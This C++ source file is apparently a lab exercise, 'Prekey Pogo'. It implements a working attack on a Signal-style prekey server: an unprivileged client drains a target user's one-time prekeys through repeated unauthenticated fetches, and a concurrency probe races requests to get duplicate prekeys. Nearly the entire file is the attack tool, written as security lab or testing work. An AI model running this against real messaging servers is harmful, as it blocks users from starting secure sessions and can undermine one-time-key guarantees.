// attack1.cpp — Prekey Pogo (one-time-prekey exhaustion)
//
// Role: Mallory, an ORDINARY client (no special network position). Bob has
// published a prekey bundle and gone offline. Each fetch_bundle for Bob hands
// out — and consumes — one of his one-time prekeys (OPKs); the response's
// `count` reports how many remain. If fetching is unauthenticated and not
// rate-limited, Mallory can drain Bob's OPK inventory so that no new session
// can be started with Bob until he republishes.
//
// STAGE: Step 2 — drain loop. Over a SINGLE connection, repeatedly fetch_bundle
// until the pool is empty (count<=0 or the server returns an `err`), or until an
// optional --count N cap is hit. Each fetch is logged with its opk_id so we can
// confirm the inventory walks down and the ids do not repeat. Step 1's single
// fetch is just --count 1.
//
// Build:  make
// Run:    ./attack1                       (defaults: drain bob, server :9000)
//         ./attack1 --count 10            (at most 10 fetches)
//         ./attack1 --no-register         (fetch is unauthenticated — no identity)
//         ./attack1 --target bob --user mallory
//         see README.md for the full scenario setup

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cctype>
#include <cerrno>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <algorithm>

#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

// ---------------------------------------------------------------------------
// Config — adjust to the lab environment.
// ---------------------------------------------------------------------------
namespace cfg {
    const char* SERVER_ADDR = "127.0.0.1";  // real server (host-published port)
    const int   SERVER_PORT = 9000;
}

static std::string g_target   = "bob";      // whose OPKs we drain
static std::string g_user     = "mallory";  // username Mallory registers as
static bool        g_register = true;       // --no-register to skip register
static long        g_count    = -1;         // max fetches; -1 = until drained
static int         g_concurrent = 0;        // >0: fire K simultaneous fetches (A.3 probe)
static std::string g_server   = cfg::SERVER_ADDR;
static int         g_port     = cfg::SERVER_PORT;

// ---------------------------------------------------------------------------
// Tiny JSON field readers (good enough for the lab's one-line frames).
// ---------------------------------------------------------------------------
static std::string json_str_field(const std::string& line, const std::string& key) {
    std::string pat = "\"" + key + "\":\"";
    size_t p = line.find(pat);
    if (p == std::string::npos) return "";
    p += pat.size();
    size_t q = line.find('"', p);
    if (q == std::string::npos) return "";
    return line.substr(p, q - p);
}

// Read the integer value of a top-level "key":<int> pair; `def` if absent.
static long json_int_field(const std::string& line, const std::string& key, long def = -1) {
    std::string pat = "\"" + key + "\":";
    size_t p = line.find(pat);
    if (p == std::string::npos) return def;
    size_t b = p + pat.size();
    while (b < line.size() && line[b] == ' ') ++b;
    size_t e = b;
    if (e < line.size() && line[e] == '-') ++e;
    size_t d0 = e;
    while (e < line.size() && std::isdigit((unsigned char)line[e])) ++e;
    if (e == d0) return def;
    return std::strtol(line.c_str() + b, nullptr, 10);
}

// ---------------------------------------------------------------------------
// A line-oriented connection to the server.
// ---------------------------------------------------------------------------
struct Conn {
    int         fd = -1;
    std::string buf;   // leftover bytes not yet split into a line
};

// Dial the server (addr may be a hostname or an IP).
static int dial_server(const std::string& addr, int port) {
    char ports[8];
    std::snprintf(ports, sizeof(ports), "%d", port);

    addrinfo hints{};
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    addrinfo* res = nullptr;
    if (getaddrinfo(addr.c_str(), ports, &hints, &res) != 0) {
        std::fprintf(stderr, "[attack1] cannot resolve %s\n", addr.c_str());
        return -1;
    }
    int fd = -1;
    for (addrinfo* p = res; p; p = p->ai_next) {
        fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (fd < 0) continue;
        if (connect(fd, p->ai_addr, p->ai_addrlen) == 0) break;
        close(fd); fd = -1;
    }
    freeaddrinfo(res);
    if (fd < 0) std::fprintf(stderr, "[attack1] cannot connect to %s:%d\n", addr.c_str(), port);
    return fd;
}

// Write one newline-terminated request (handles short writes).
static bool conn_writeline(Conn& c, const std::string& s) {
    std::string out = s;
    out.push_back('\n');
    size_t off = 0;
    while (off < out.size()) {
        ssize_t w = send(c.fd, out.data() + off, out.size() - off, 0);
        if (w <= 0) return false;
        off += (size_t)w;
    }
    return true;
}

// Read one newline-terminated response line (without the newline).
static bool conn_readline(Conn& c, std::string& line) {
    for (;;) {
        size_t nl = c.buf.find('\n');
        if (nl != std::string::npos) {
            line = c.buf.substr(0, nl);
            c.buf.erase(0, nl + 1);
            return true;
        }
        char data[4096];
        ssize_t n = recv(c.fd, data, sizeof(data), 0);
        if (n <= 0) return false;
        c.buf.append(data, n);
    }
}

// ---------------------------------------------------------------------------
// One fetch_bundle round-trip.
//
// Outcome tells the drain loop how to proceed without conflating cases: the
// server omits `count` on the LAST successful bundle (Step 1 showed this as a
// spurious -1), so a missing count must NOT be read as an error. We therefore
// report GOT_BUNDLE/EMPTY/FAILED explicitly and carry `count` separately.
// ---------------------------------------------------------------------------
enum class Outcome { GOT_BUNDLE, EMPTY, FAILED };

struct FetchResult {
    Outcome outcome = Outcome::FAILED;
    long    count   = -1;   // OPKs server says remain (-1 = not reported)
    long    opk_id  = -1;   // id handed out this fetch (-1 = none/absent)
};

static FetchResult do_fetch(Conn& c, const std::string& target, int idx) {
    FetchResult r;
    std::string req = "{\"type\":\"fetch_bundle\",\"user\":\"" + target + "\"}";
    if (!conn_writeline(c, req)) {
        std::fprintf(stderr, "[attack1] fetch #%d: send failed\n", idx);
        return r;  // FAILED
    }
    std::string resp;
    if (!conn_readline(c, resp)) {
        std::fprintf(stderr, "[attack1] fetch #%d: no response\n", idx);
        return r;  // FAILED
    }

    if (json_str_field(resp, "type") == "err") {
        std::printf("[attack1] fetch #%d -> EMPTY: %s\n",
                    idx, json_str_field(resp, "err").c_str());
        r.outcome = Outcome::EMPTY;
        return r;
    }

    r.outcome = Outcome::GOT_BUNDLE;
    r.count   = json_int_field(resp, "count", -1);
    r.opk_id  = json_int_field(resp, "opk_id", -1);
    std::printf("[attack1] fetch #%d -> opk_id=%ld, OPKs remaining=%s\n",
                idx, r.opk_id,
                r.count >= 0 ? std::to_string(r.count).c_str() : "?(not reported)");
    return r;
}

// Drain Bob's OPK pool over a single connection: fetch until the server reports
// EMPTY (err), until the reported count reaches 0, or until the --count cap is
// hit. Returns the number of OPKs successfully pulled.
static long drain(Conn& c, const std::string& target, long cap) {
    long pulled = 0;
    for (int idx = 1; cap < 0 || pulled < cap; ++idx) {
        FetchResult r = do_fetch(c, target, idx);
        if (r.outcome == Outcome::EMPTY) {
            std::printf("[attack1] pool exhausted after %ld OPK(s) pulled\n", pulled);
            break;
        }
        if (r.outcome == Outcome::FAILED) {
            std::fprintf(stderr, "[attack1] aborting: connection/parse failure\n");
            break;
        }
        ++pulled;  // GOT_BUNDLE
        // count==0 means that bundle was the last one; stop before a wasted err.
        if (r.count == 0) {
            std::printf("[attack1] last OPK pulled (server reports 0 remaining)\n");
            break;
        }
    }
    return pulled;
}

// ---------------------------------------------------------------------------
// Concurrency probe (spec A.3): open K independent connections, then have all K
// fire a SINGLE fetch_bundle at the same instant. If the server's allocation is
// not atomic, two racing requests may be handed the SAME opk_id — meaning two
// different initiators would derive a session against one one-time prekey,
// breaking its "one-time" guarantee. We synchronise on a spin flag to make the
// fetches land as close together as possible, then report any duplicate ids.
// ---------------------------------------------------------------------------
static void probe_concurrent(const std::string& target, int k) {
    std::printf("[attack1] concurrency probe: %d simultaneous fetches for '%s'\n",
                k, target.c_str());

    std::vector<Conn>        conns(k);
    std::vector<long>        ids(k, -2);     // -2 = not run, -1 = err/absent
    std::vector<std::string> notes(k);

    // Pre-connect (and register, unless --no-register) so only the fetch races.
    int ready = 0;
    for (int i = 0; i < k; ++i) {
        conns[i].fd = dial_server(g_server, g_port);
        if (conns[i].fd < 0) { notes[i] = "connect failed"; continue; }
        if (g_register) {
            std::string reg = "{\"type\":\"register\",\"user\":\"" + g_user +
                              std::to_string(i) + "\"}";
            std::string resp;
            if (!conn_writeline(conns[i], reg) || !conn_readline(conns[i], resp)) {
                notes[i] = "register failed";
                close(conns[i].fd); conns[i].fd = -1; continue;
            }
        }
        ++ready;
    }
    std::printf("[attack1] %d/%d connections ready\n", ready, k);

    std::atomic<bool> go(false);
    std::vector<std::thread> workers;
    for (int i = 0; i < k; ++i) {
        if (conns[i].fd < 0) continue;
        workers.emplace_back([&, i]() {
            while (!go.load(std::memory_order_acquire)) { /* spin until released */ }
            FetchResult r = do_fetch(conns[i], target, i + 1);
            ids[i] = (r.outcome == Outcome::GOT_BUNDLE) ? r.opk_id : -1;
            if (r.outcome == Outcome::EMPTY) notes[i] = "empty";
        });
    }
    go.store(true, std::memory_order_release);  // release all at once
    for (auto& t : workers) t.join();
    for (int i = 0; i < k; ++i) if (conns[i].fd >= 0) close(conns[i].fd);

    // Tally handed-out ids and flag any served to more than one request.
    std::vector<long> got;
    for (int i = 0; i < k; ++i) if (ids[i] >= 0) got.push_back(ids[i]);
    std::sort(got.begin(), got.end());

    std::printf("[attack1] ids handed out: ");
    for (long v : got) std::printf("%ld ", v);
    std::printf("\n");

    bool dup = false;
    for (size_t i = 1; i < got.size(); ++i) {
        if (got[i] == got[i - 1]) {
            std::printf("[attack1] *** DUPLICATE opk_id=%ld served to >1 request "
                        "(non-atomic allocation!)\n", got[i]);
            dup = true;
        }
    }
    if (!dup)
        std::printf("[attack1] no duplicate ids — allocation looks atomic for this run\n");
    std::printf("[attack1] (re-run a few times; a race may only show intermittently)\n");
}

int main(int argc, char** argv) {
    for (int i = 1; i < argc; ++i) {
        if (std::strcmp(argv[i], "--target") == 0 && i + 1 < argc)
            g_target = argv[++i];
        else if (std::strcmp(argv[i], "--user") == 0 && i + 1 < argc)
            g_user = argv[++i];
        else if (std::strcmp(argv[i], "--no-register") == 0)
            g_register = false;
        else if (std::strcmp(argv[i], "--count") == 0 && i + 1 < argc)
            g_count = std::atol(argv[++i]);
        else if (std::strcmp(argv[i], "--concurrent") == 0 && i + 1 < argc)
            g_concurrent = std::atoi(argv[++i]);
        else if (std::strcmp(argv[i], "--server") == 0 && i + 1 < argc)
            g_server = argv[++i];
        else if (std::strcmp(argv[i], "--port") == 0 && i + 1 < argc)
            g_port = std::atoi(argv[++i]);
    }

    const char* mode = g_concurrent > 0 ? "Step 3: concurrency probe"
                                        : "Step 2: drain loop";
    std::printf("[attack1] Prekey Pogo (%s)\n", mode);
    std::printf("[attack1] server %s:%d  target '%s'  as '%s'  cap %s\n",
                g_server.c_str(), g_port, g_target.c_str(),
                g_register ? g_user.c_str() : "(unregistered)",
                g_count < 0 ? "until-drained" : std::to_string(g_count).c_str());

    // Step 3: concurrency probe owns its own K connections — run and exit.
    if (g_concurrent > 0) {
        probe_concurrent(g_target, g_concurrent);
        std::printf("[attack1] done.\n");
        return 0;
    }

    Conn c;
    c.fd = dial_server(g_server, g_port);
    if (c.fd < 0) return 1;

    if (g_register) {
        std::string reg = "{\"type\":\"register\",\"user\":\"" + g_user + "\"}";
        std::string resp;
        if (!conn_writeline(c, reg) || !conn_readline(c, resp)) {
            std::fprintf(stderr, "[attack1] register failed\n");
            close(c.fd);
            return 1;
        }
        std::printf("[attack1] register '%s' -> %s\n", g_user.c_str(), resp.c_str());
    }

    // Step 2: drain the pool over this one connection (--count caps it; -1 = all).
    long pulled = drain(c, g_target, g_count);

    close(c.fd);
    std::printf("[attack1] done — %ld OPK(s) pulled.\n", pulled);
    return 0;
}
